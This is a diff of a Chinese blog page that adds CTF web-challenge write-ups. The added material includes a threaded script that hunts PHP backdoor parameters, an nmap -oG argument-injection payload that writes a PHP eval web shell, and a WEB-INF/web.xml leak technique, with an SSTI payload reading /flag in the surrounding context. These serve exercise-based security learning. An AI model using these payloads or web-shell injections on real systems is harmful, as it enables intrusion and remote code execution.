@@ -358,21 +358,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-02
+                    2021-03-06
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    2.1k
+                    3.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    9 分
+                    15 分
                 </div>
                 
 
@@ -666,6 +666,121 @@ HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span><
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用tplmap启动伪终端使用<code>--os-shell</code>直接查看flag</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>下载下来网站的备份文件发现有好几千个文件。。。每个文件里面都有一些看似可以进行RCE的参数，但大部分测试发现都是无效的。</p>
+<p>思路就是跑脚本去一个个的测试了</p>
+<p>自己还编写不来测试脚本，这里学习一下一位大佬编写的python脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> time
+
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/src/"</span>
+files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"C://Users//Administrator//Desktop//www//src"</span><span class="token punctuation">)</span>
+<span class="token comment">#print(files)</span>
+
+<span class="token keyword">def</span> <span class="token function">GetGet</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+	f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"C://Users//Administrator//Desktop//www//src//"</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
+	content <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+		<span class="token keyword">if</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+			start <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_GET['"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">7</span>
+			end <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>
+			a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>
+	<span class="token keyword">return</span> a
+
+<span class="token keyword">def</span> <span class="token function">GetPost</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+	f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"C://Users//Administrator//Desktop//www//src//"</span><span class="token operator">+</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>
+	content <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>
+		<span class="token keyword">if</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_POST['"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+			start <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$_POST['"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>
+			end <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span>start<span class="token punctuation">)</span>
+			a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span>start<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>
+	<span class="token keyword">return</span> a
+
+<span class="token keyword">def</span> <span class="token function">Send</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span>
+	end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		i <span class="token operator">=</span> files<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+		get <span class="token operator">=</span> GetGet<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Try filename: %s"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> get<span class="token punctuation">:</span>
+			NewUrl <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"%s?%s=%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token string">'echo "Success!!!"'</span><span class="token punctuation">)</span>
+			s <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>NewUrl<span class="token punctuation">)</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"Success"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Success! Url:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>NewUrl<span class="token punctuation">)</span><span class="token punctuation">)</span>
+				<span class="token keyword">break</span>
+		post <span class="token operator">=</span> GetPost<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> post<span class="token punctuation">:</span>
+			NewUrl <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+			s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>NewUrl<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span>j<span class="token punctuation">:</span><span class="token string">"echo 'Success!!'"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"Success"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
+				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Success! Post:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+				<span class="token keyword">break</span>
+
+<span class="token keyword">class</span> <span class="token class-name">myThread</span> <span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> threadID<span class="token punctuation">,</span> name<span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>threadID <span class="token operator">=</span> threadID
+        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
+        self<span class="token punctuation">.</span>counter <span class="token operator">=</span> counter
+    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>               
+        Send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>counter<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	thread <span class="token operator">=</span> myThread<span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span>
+	thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>代码地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/103527666">https://blog.csdn.net/qq_42967398/article/details/103527666</a></p>
+<p>找到了利用文件： xk0SzyKwfzw.php  and 找到了利用的参数：Efa5BVG </p>
+<p>直接查看flag就行了</p>
+<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
+    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这题之前好像在攻防世界做过</p>
+<p>escapeshellarg()和escapeshellcmd() 两个函数一起用会出现问题</p>
+<blockquote>
+<p>传入的参数是：172.17.0.2’ -v -d a=1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用<br>经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义<br>最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p>
+</blockquote>
+<p>nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
+<pre class="line-numbers language-none"><code class="language-none">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个命令的输入是可控的，通过nmap写个木马进去，根据返回的文件路径连接上去就行了</p>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306104530832.png" alt="image-20210306104530832"></p>
+<p>在这里试了一些常见的账号密码都不行，点击help发现url变成了<code>http://780e4c0e-2a61-4620-8ac8-f2acd57f0d0d.node3.buuoj.cn/Download?filename=help.docx</code>可能存在文件包含，但这是java的，自己没做过，查找资料发现有个WEB-INF/web.xml泄露</p>
+<blockquote>
+<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>
+<p>   /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</p>
+<p>   /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</p>
+<p>   /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>
+<p>   /WEB-INF/src/：源码目录，按照包名结构放置各个java文件</p>
+<p>   /WEB-INF/database.properties：数据库配置文件</p>
+<p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306105407809.png" alt="image-20210306105407809"></p>
+<p>flag可能在那个文件中访问试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306105659682.png" alt="image-20210306105659682"></p>
+<p>这段base64解码应该就是了</p>
 
                 
             </div>
@@ -1046,7 +1161,7 @@ HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span><
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">40.3k</span>&nbsp;字
+                class="white-color">41.8k</span>&nbsp;字
             
             
             
